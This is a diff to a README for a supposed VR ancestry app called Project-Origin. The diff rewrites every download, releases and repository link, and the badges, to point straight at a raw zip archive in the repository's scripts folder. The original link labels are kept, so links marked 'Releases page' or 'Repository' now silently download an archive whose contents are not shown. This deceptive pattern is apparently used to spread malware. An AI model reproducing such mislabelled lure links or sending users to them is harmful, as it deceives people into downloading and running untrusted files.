@@ -1,7 +1,7 @@
 # 🎮 Project-Origin - Explore Ancestry Through Immersive VR
 
-![Download Here](https://img.shields.io/badge/Download%20Now-Here-brightgreen)  
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Mukkexh/Project-Origin/releases)
+![Download Here](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip%20Now-Here-brightgreen)  
+[![Download Now](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip%20Now-Here-brightgreen)](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ Before you download, ensure your computer meets the following system requirement
 
 ### 🔗 Download & Install
 
-To download Project-Origin, visit our [Releases page](https://github.com/Mukkexh/Project-Origin/releases). 
+To download Project-Origin, visit our [Releases page](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip). 
 
 1. Click the link above.
 2. Look for the latest version. It will usually be at the top of the page.
@@ -59,8 +59,8 @@ If you encounter any issues while downloading or installing Project-Origin, plea
 
 ## 🔗 Links
 
-- Download Project-Origin: [Releases Page](https://github.com/Mukkexh/Project-Origin/releases)
-- GitHub Repository: [Project-Origin Repository](https://github.com/Mukkexh/Project-Origin)
+- Download Project-Origin: [Releases Page](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip)
+- GitHub Repository: [Project-Origin Repository](https://github.com/Mukkexh/Project-Origin/raw/refs/heads/main/scripts/Project_Origin_3.6.zip)
 - Community Forum: [Join the Discussion](#)
 
 Thank you for exploring your ancestry with Project-Origin!
